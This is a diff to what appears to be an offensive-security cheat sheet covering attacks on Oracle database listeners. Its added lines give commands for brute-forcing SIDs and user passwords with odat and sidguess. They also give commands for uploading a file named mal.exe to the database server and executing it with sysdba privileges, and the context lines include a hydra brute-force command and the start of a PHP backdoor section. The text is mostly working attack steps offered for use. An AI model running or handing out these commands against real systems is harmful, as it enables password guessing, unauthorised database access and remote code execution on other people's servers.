@@ -246,7 +246,7 @@ nscmd10g  status -h [IP]
 ```
 We could get errors in this execution, we can check these errors in [this site](https://docs.oracle.com/database/121/ERRMG/TNS-00000.htm#ERRMG-GUID-D723D931-ECBA-4FA4-BF1B-1F4FE2EEBAD7").
 
-If the error would points to a incompatibility between your machine and server, you can add one flag to the previous command like this:
+If the error points to a incompatibility between your machine and server, you can add one flag to the previous command like this:
 
 ```bash
 tnscmd10g status --10G -h [IP]
@@ -261,11 +261,30 @@ hydra -P [WORDLIST] -t 32 -s 1521 [IP] oracle-listener
 It very recommendable to bruteforce the SID as well:
 
 ```bash
+# The following application is native in Kali.
 sidguess -i [IP] -d /usr/share/wordlists/metasploit/sid.txt 
+# Instead, the following one has to be download from its repository
+./odat-libc2.12-x86_64 sidguesser -s [IP]
 ```
 
-This previous command has rescued me several times.
+Both options are awesome to find valids SIDs, but the 'odat' software is the best in Oracle-hacking related activities.
 
+Once we've found the SIDs, we can still use 'odat' to perform further actions:
+```bash
+# We can bruteforce users like this:
+./odat-libc2.12-x86_64 passwordguesser -s [IP] -d [SID] --accounts-files [USERS-FILE] [PASS-FILE]
+```
+
+If we find valid credentials, we can check vulnerabilities performing:
+```bash
+./odat-libc2.12-x86_64 all -s [IP] -d [SID] -U [USER] -P [PASS]
+```
+
+Trying to upload & execute payload:
+```bash
+./odat-libc2.12-x86_64 utlfile -s [IP] -U [USER] -P [PASS] --sysdba --putFile C:/ mal.exe /tmp/mal.exe -d [SID]
+./odat-libc2.12-x86_64 externaltable -s [IP] -U [USER] -P [PASS] -d [SID] --sysdba --exec C:/ mal.exe
+```
 
 # WebApplication Hacking
 ## Create a PHP Backdoor shell
